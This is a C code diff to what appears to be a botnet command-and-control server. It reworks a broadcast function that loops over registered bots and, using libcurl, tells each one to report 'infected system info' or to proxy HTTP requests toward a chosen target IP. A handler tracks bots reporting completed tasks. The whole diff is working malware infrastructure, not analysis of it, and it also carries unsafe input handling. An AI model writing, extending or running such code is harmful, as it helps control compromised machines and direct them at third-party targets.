@@ -135,7 +135,7 @@ void parent(/*int pid*/)
                 if (strcmp(broadcast, "s\n") != 0)
                 {
                     printf("Broadcastring commmand to botnet\n");
-
+                    list_botnet(1);
                     broadcastCommand(command, target_ip);
                 }
                 else
@@ -146,7 +146,9 @@ void parent(/*int pid*/)
                     ret = list_botnet(0);
 
                     if (ret < 0)
+                    {
                         continue;
+                    }
 
                     char bot_id[100];
                     fgets(bot_id, 100, stdin);
@@ -159,6 +161,7 @@ void parent(/*int pid*/)
                     }
                     else
                     {
+                        list_botnet(1);
                         sendCommand(command, bot, target_ip);
                     }
                 }
@@ -302,7 +305,7 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     struct in_addr address;
     inet_pton(AF_INET, bot_ip, &(address));
 
-    // TODO get updates from bots
+    puts("\n");
 
     if (findBot(address, port) == -1)
     {
@@ -321,13 +324,9 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     if (endpoint != NULL)
     {
 
-        printf("Botnet :\n");
-        list_botnet(1);
-
         printf("Bot completed its task... \n");
         int ID = 0;
-        getBotID(bot_ip, bot_port,&ID);
-
+        getBotID(bot_ip, bot_port, &ID);
 
         if (ID == -1)
         {
@@ -342,7 +341,6 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     }
 
     printf("Botnet updated:\n");
-    list_botnet(1);
 
     MHD_destroy_response(response);
 
@@ -354,85 +352,41 @@ void broadcastCommand(char *command, char *target_ip)
 
     CURL *curl;
 
-    curl = curl_easy_init();
+    CURLcode res;
 
-    if (curl == NULL)
-        handle_error("Could not execute command, error initializing curl handle");
-    else
+    char url[255] = {0};
+    char request[MAX_REQ_SIZE];
+    char *new_url;
+
+    char bot_ip[INET_ADDRSTRLEN] = {0};
+    long bot_port;
+
+    active_bots *bot = botnet;
+
+    
+
+
+
+    if (strcmp(command, HTTP_REQ) == 0)
     {
 
-        CURLcode res;
+        printf("\nInsert request to proxy : ");
+        scanf("%s", request);
 
-        char url[255] = {0};
-        char request[MAX_REQ_SIZE];
-        char *new_url ;
+    }
 
-        char bot_ip[INET_ADDRSTRLEN] = {0};
-        long bot_port;
+    if (strcmp(command, SYS_INFO) == 0)
+    {
+        printf("\nRetrieving infected system info");
 
-        active_bots *bot = botnet;
+    }
 
-        while (bot != NULL)
-        {
-            if (bot->bot_id == 0)
-            {
-                bot = bot->next;
-                continue;
-            }
-            ret = setBotInfo(&bot_port, bot_ip, bot->bot_id);
-            if (ret < 0)
-            {
-                printf("\nCould not set bot info");
-                return;
-            }
+    active_bots *b_http = botnet;
 
-            printf("Updating bot info\n");
-            if (strcmp(target_ip, "self") == 0)
-            {
-                updateBotInfo(bot->bot_id, bot_ip, command);
-            }
-            else
-            {
-                updateBotInfo(bot->bot_id, target_ip, command);
-            }
-
-            bot = bot->next;
-        }
-
-        // * BUILDING REQUEST
-
-        strcpy(url, PROTOCOL);
-
-        strcat(url, bot_ip);
-
-        // printf("%s", url);
-
-        if (strcmp(command, HTTP_REQ) == 0)
-        {
-
-            printf("\nInsert request to proxy : ");
-            scanf("%s", request);
-            new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
-            memcpy(new_url, url, sizeof(url));
-            strcat(new_url, HTTP_REQ_ENDPOINT);
-            strcat(new_url, request);
-            curl_easy_setopt(curl, CURLOPT_URL, new_url);
-
-            printf("\nSending request:  %s ", new_url);
-        }
-
-        if (strcmp(command, SYS_INFO) == 0)
-        {
-            printf("\nRetrieving infected system info");
-
-            strcat(url, "/sys_info");
-            curl_easy_setopt(curl, CURLOPT_URL, url);
-            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-        }
-
-        active_bots *b_http = botnet;
-
-        while (b_http != NULL)
+    while (b_http != NULL)
+    {
+        curl = curl_easy_init();
+        if (curl)
         {
             if (b_http->bot_id == 0)
             {
@@ -440,15 +394,59 @@ void broadcastCommand(char *command, char *target_ip)
                 continue;
             }
 
+            printf("Updating bot info\n");
+            if (strcmp(target_ip, "self") == 0)
+            {
+                updateBotInfo(b_http->bot_id, bot_ip, command);
+            }
+            else
+            {
+                updateBotInfo(b_http->bot_id, target_ip, command);
+            }
+
+            ret = setBotInfo(&bot_port, bot_ip, b_http->bot_id);
+            if (ret < 0)
+            {
+                printf("\nCould not set bot info");
+                return;
+            }
+
+            strcpy(url, PROTOCOL);
+
+            strcat(url, bot_ip);
+
+            if (strcmp(command, SYS_INFO) == 0)
+            {
+                strcat(url, "/sys_info");
+                curl_easy_setopt(curl, CURLOPT_URL, url);
+                curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
+            }
+            else
+            {
+                new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
+
+                memcpy(new_url, url, sizeof(url));
+                strcat(new_url, HTTP_REQ_ENDPOINT);
+                strcat(new_url, request);
+                curl_easy_setopt(curl, CURLOPT_URL, new_url);
+            }
+
             curl_easy_setopt(curl, CURLOPT_PORT, b_http->port);
+            curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
+
+            curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 20);
+            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20);
 
             res = curl_easy_perform(curl);
+            if (res != CURLE_OK)
+            {
+                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+                curl_easy_cleanup(curl);
+            }
 
-            b_http = b_http->next;
+            if (strcmp(command, HTTP_REQ) == 0)
+                free(new_url);
         }
-        curl_easy_cleanup(curl);
-        if(strcmp(command, HTTP_REQ) == 0)
-            free(new_url);
-
+        b_http = b_http->next;
     }
 }
